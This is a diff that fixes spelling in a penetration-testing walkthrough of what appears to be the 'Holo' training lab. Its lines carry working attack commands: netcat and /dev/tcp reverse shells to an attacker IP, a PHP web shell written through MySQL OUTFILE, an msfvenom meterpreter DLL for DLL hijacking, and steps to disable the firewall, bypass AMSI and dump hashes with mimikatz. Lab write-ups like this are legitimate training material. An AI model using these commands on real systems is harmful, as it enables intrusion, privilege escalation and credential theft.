@@ -1065,7 +1065,7 @@ Let's try out --- the payload we used is ` http://admin.holo.live/dashboard.php?
 
 ![rce-2-dashboard.php-admin.holo.live](img/rce-2-dashboard.php-admin.holo.live.png)
 
-Let's modofied our payload to get reverse shell to ` http://admin.holo.live/dashboard.php?cmd=nc%20-c%20bash%2010.50.103.20%2018888 `
+Let's modified our payload to get reverse shell to ` http://admin.holo.live/dashboard.php?cmd=nc%20-c%20bash%2010.50.103.20%2018888 `
 
 We are using curl to perform this exploit to get our reverse shell
 
@@ -1077,7 +1077,7 @@ Reverse shell called back from admin.holo.live:
 
 ![reverse-shell-admin.holo.live](img/reverse-shell-admin.holo.live.png)
 
-Enumeration directories on target system:
+We then enumerate directories on target system:
 
 ![enumerate-system-1-admin.holo.live.png](img/enumerate-system-1-admin.holo.live.png)
 
@@ -1099,11 +1099,11 @@ find / -type f -name "*.dockerenv" -ls 2>/dev/null
 
 ![dockerenv-admin.holo.live](img/dockerenv-admin.holo.live.png)
 
-Since this is a docker container, we know that docker usually create docker network as internal network to connect diffirent containers, we decided to check out the network information from current docker container by using ` ifconfig `.
+Since this is a docker container, we know that docker often create docker network as internal network to connect different containers, we decided to check out the network information from current docker container by using ` ifconfig `.
 
 ![ifconfig-admin.holo.live](img/ifconfig-admin.holo.live.png)
 
-From the netwoork information shown, we currently on ` 192.168.100.0/24 ` network which is inaccessible from Holo corporate network (10.200.107.0/24)
+From the network information shown, we currently on ` 192.168.100.0/24 ` network which is inaccessible from Holo corporate network (10.200.107.0/24)
 
 We then check on  the routing information by using ` route -nv `
 
@@ -1121,7 +1121,7 @@ for port in {1..20000}; do timeout 2 nc -znv 192.168.100.1 $port 2>&1 | grep ope
 
 From the port scanning result, we know that there is mysql service running on ` 192.168.100.1 `, we may use the credential found previously (db_connect.php) to login into mysql server which reside on ` 192.168.100.1 `
 
-We can confirmed this by checking if mysql client connection is running on current docker container by using ` ps -elf | grep mysql `
+We can confirm this by checking if mysql client connection is running on current docker container by using ` ps -elf | grep mysql `
 
 ![mysql-client-192.168.100.100](img/mysql-client-192.168.100.100.png)
 
@@ -1143,11 +1143,11 @@ We then perform enumeration and information gathering from mysql server:
 
     ![use-dashboarddb](img/use-dashboarddb.png)
 
-- We use ` show tables; ` to understand what are the tables available on this ` DashboardDB ` database and we found a user table, we have dump the enitre user table out.
+- We use ` show tables; ` to understand what the tables are available on this ` DashboardDB ` database and we found a user table, we have dumped the entire user table out.
 
     ![show-tables](img/show-tables.png)
 
-- We also dumping the user table from mysql database, as we know this is the table store the credentials of mysql by ` SELECT User FROM mysql.user; ` and ` ELECT host,User,authentication_string FROM mysql.user; `
+- We also dumping the user table from mysql database, as we know this is the table store the credentials of mysql by ` SELECT User FROM mysql.user; ` and ` SELECT host,User,authentication_string FROM mysql.user; `
 
     ![user-mysql-1](img/user-mysql-1.png)
 
@@ -1157,13 +1157,13 @@ As we have the access to mysql server on ` 192.168.100.1 `, we can exploit the m
 
 Here is the reference --- [Generate Backdoor via SQL Injection](http://scx020c07c.blogspot.com/2012/09/generate-backdoor-via-sql-injection.html)
 
-Below is the actions we perform to escape current docker container and gain access to the host system.
+Below are the actions we perform to escape current docker container and gain access to the host system.
 
 - Create a table named "hacker" under the active database, in this case the active database is ` DashboardDB `, though we can also create our own database, however to ensure the access to the host system and being low-profile we going to use current active database.
 
 - Then we use "INSERT" statement to insert our php payload  --- ` <?php $cmd=$_GET[“cmd”];system($cmd);?> ` into the table just created.
 
-- Next, we use "SELECT" statement with "outfile" feature to dump the php payload to a file --- ` <?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php `
+- Next, we use "SELECT" statement with "outfile" feature to dump the php payload to a file --- ` SELECT <?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php `
 
 - Last, we use "curl" command to get the response of our php to ensure our php payload is working properly --- ` curl 192.168.100.1:8080/shell.php?cmd=whoami `.
 
@@ -1194,11 +1194,11 @@ bash -i >& /dev/tcp/10.50.103.20/23333 0>&1
 
 ![rev.sh-2](img/rev.sh-2.png)
 
-Next, we spin up python web server allow target host system to get our reverse shell script --- ` pythom -m http.server 80 `
+Next, we spin up python web server allow target host system to get our reverse shell script --- ` python3 -m http.server 80 `
 
 ![python-http-server](img/python-http-server.png)
 
-In the meantime, we aalso aspin up netcat listener to catch the callback from target host system --- ` sudo nc -lnvvp 23333 `
+In the meantime, we also spin up netcat listener to catch the callback from target host system --- ` sudo nc -lnvvp 23333 `
 
 ![nc-2333](img/nc-23333.png)
 
@@ -1235,7 +1235,7 @@ Result of setuid bit binaries:
 
 ![setuid-bit-binaries](img/setuid-bit-binaries.png)
 
-We notice unsual ` docker ` binary with setuid, searching online with the reference <https://gtfobins.github.io/gtfobins/docker/#suid> showing we are able to exploit such ` docker ` binary with setuid bit to escalate privilege to root.
+We notice unusual ` docker ` binary with setuid, searching online with the reference <https://gtfobins.github.io/gtfobins/docker/#suid> showing we are able to exploit such ` docker ` binary with setuid bit to escalate privilege to root.
 
 ![docker-setuid](img/docker-setuid.png)
 
@@ -1452,7 +1452,7 @@ Request header of forgot password page:
 
 ![request-header-of-forgot-password-page](img/request-header-of-forgot-password-page.png)
 
-Now we try to reset "gurag" password as it is a valid user to allow us login.
+Now we try to reset "gurag" password as it is a valid user that allow us login.
 
 ![request-header-reset-gurag](img/request-header-reset-gurag.png)
 
@@ -1462,9 +1462,9 @@ Here is the response cookies from the reset password:
 
 ![response-cookie-gurag](img/response-cookie-gurag.png)
 
-From the response cookies, we are able to retrieve the "user_token" which is a weak password reset mechanism fall under OWASP - Broken Authentication.
+From the response cookies, we are able to retrieve the "user_token" which is a weak password reset mechanism fall under [OWASP - Broken Authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication).
 
-With the "user_token" visible, we now able to craft a valid password reset link for our taregted user "gurag"
+With the "user_token" visible, we are now able to craft a valid password reset link for our targeted user "gurag"
 
 The payload we used as below:
 
@@ -1522,9 +1522,9 @@ Source of upload image page
 
 ![source-upload-image-page](img/source-upload-image-page.png)
 
-From the source of upload image page, we can see that it is using a javascirpt named "upload.js" to process the upload.
+From the source of upload image page, we can see that it is using a JavaScript named "upload.js" to process the upload.
 
-We have check on the "upload.js" javascript, below is what we found interesting; basically it allow us to upload anything to ` 10.200.107.31 `
+We have check on the "upload.js" JavaScript, below is what we found interesting; basically it allow us to upload anything to ` 10.200.107.31 `
 
 ![content-of-upload.js](img/content-of-upload.js.png)
 
@@ -1574,7 +1574,7 @@ Here is the call-back received on our attacker machine
 
 ![reverse-shell-callbacked](img/reverse-shell-callbacked.png)
 
-Right awar, we know this is a Windows system, and checking basic information as below:
+Right away, we know this is a Windows system, and checking basic information as below:
 
 ![basic-information-10.200.107.31](img/basic-information-10.200.107.31.png)
 
@@ -1676,15 +1676,15 @@ Immediate we check only is there any vulnerability or exploit for this applicati
 
 It is exploitable with DLL hijacking.
 
-First we create a malicious DLL that embeded reverse shell meterpreter module form metasploit for the vulnerable application using ` msfvenom ` on out attcker machine as per below command.
+First we create a malicious DLL that embedded reverse shell meterpreter module form metasploit for the vulnerable application using ` msfvenom ` on out attacker machine as per below command.
 
 ```bash
 sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.103.20 LPORT=16666 -f dll -o kavremoverENU.dll
 ```
 
-Then we use the same ` Invoke-WebRequest ` powershell command to download the malicious DLL from our attacker machine to target syetm under ` C:\Windows\Tasks `
+Then we use the same ` Invoke-WebRequest ` powershell command to download the malicious DLL from our attacker machine to target system under ` C:\Windows\Tasks `
 
-In order for the exploit to work, we have to copy the vulnerable application from original folder to ` C:\Windows\Tasks `, as the DLL hijacking work when the vunerable application start; it will search for DLL in the same folder, this is how we exploit it.
+In order for the exploit to work, we have to copy the vulnerable application from original folder to ` C:\Windows\Tasks `, as the DLL hijacking work when the vulnerable application start; it will search for DLL in the same folder, this is how we exploit it.
 
 Next, we setup the metasploit multi-handler module on our attacker machine as below:
 
@@ -1723,7 +1723,7 @@ And we perform the same technique to gain persistent access to the system that w
 - turn off windows firewall for all profile
 - add "Everyone" into "Remote Desktop Users"
 - bypass Windows AMSI
-- upload mimikatz and dump all the available hashes such as NTLM (alternativly we can execute ` run post/windows/gather/hashdump ` in meterpreter to dump hashes as well)
+- upload mimikatz and dump all the available hashes such as NTLM (alternatively we can execute ` run post/windows/gather/hashdump ` in meterpreter to dump hashes as well)
 
 Then we start enumerate the system and found root.txt on ` C:\Users\Administrator\Desktop `
 
@@ -1796,7 +1796,7 @@ And we perform the same technique to gain persistent access to the system that w
 - turn off windows firewall for all profile
 - add "Everyone" into "Remote Desktop Users"
 - bypass Windows AMSI
-- upload mimikatz and dump all the available hashes such as NTLM (alternativly we can execute ` run post/windows/gather/hashdump ` in meterpreter to dump hashes as well)
+- upload mimikatz and dump all the available hashes such as NTLM (alternatively we can execute ` run post/windows/gather/hashdump ` in meterpreter to dump hashes as well)
 
 Then we start enumerate the system and found root.txt on ` C:\Users\Administrator\Desktop `
 
